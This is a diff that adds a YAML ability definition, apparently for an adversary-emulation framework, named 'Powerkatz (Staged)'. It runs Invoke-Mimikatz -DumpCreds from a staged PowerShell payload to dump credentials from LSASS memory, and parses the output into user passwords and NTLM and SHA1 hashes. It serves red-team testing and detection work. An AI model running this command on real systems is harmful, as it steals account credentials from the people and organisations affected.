@@ -1,0 +1,27 @@
+- id: 7049e3ec-b822-4fdf-a4ac-18190f9b66d1
+  name: Powerkatz (Staged)
+  description: Use Invoke-Mimikatz
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: "OS Credential Dumping: LSASS Memory"
+  privilege: Elevated
+  platforms:
+    windows:
+      psh:
+        command: |
+          Import-Module .\invoke-mimi.ps1;
+          Invoke-Mimikatz -DumpCreds
+        parsers:
+          plugins.stockpile.app.parsers.katz:
+          - source: domain.user.name
+            edge: has_password
+            target: domain.user.password
+          - source: domain.user.name
+            edge: has_hash
+            target: domain.user.ntlm
+          - source: domain.user.name
+            edge: has_hash
+            target: domain.user.sha1
+        payloads:
+        - invoke-mimi.ps1
